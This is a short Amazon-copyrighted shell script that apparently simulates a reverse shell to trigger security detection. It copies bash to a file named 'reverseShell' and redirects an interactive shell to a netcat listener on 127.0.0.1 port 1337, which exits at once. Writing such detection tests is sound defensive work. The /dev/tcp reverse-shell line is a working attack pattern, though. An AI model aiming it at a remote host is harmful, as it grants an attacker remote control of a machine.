#Copyright 2024 Amazon.com, Inc. or its affiliates. All Rights Reserved.
#  
#  Licensed under the Apache License, Version 2.0 (the "License").
#  You may not use this file except in compliance with the License.
#  A copy of the License is located at
#  
#      http://www.apache.org/licenses/LICENSE-2.0
#  
#  or in the "license" file accompanying this file. This file is distributed 
#  on an "AS IS" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either 
#  express or implied. See the License for the specific language governing 
#  permissions and limitations under the License.

DATE_STRING=$(date +%s)
EXEC_FILENAME="$DATE_STRING-reverseShell"

cp /bin/bash $EXEC_FILENAME
timeout 30s bash -c "echo exit | nc -nlp 1337 &"
sleep 1
./$EXEC_FILENAME -c "./$EXEC_FILENAME -i >& /dev/tcp/127.0.0.1/1337 0>&1"

rm $EXEC_FILENAME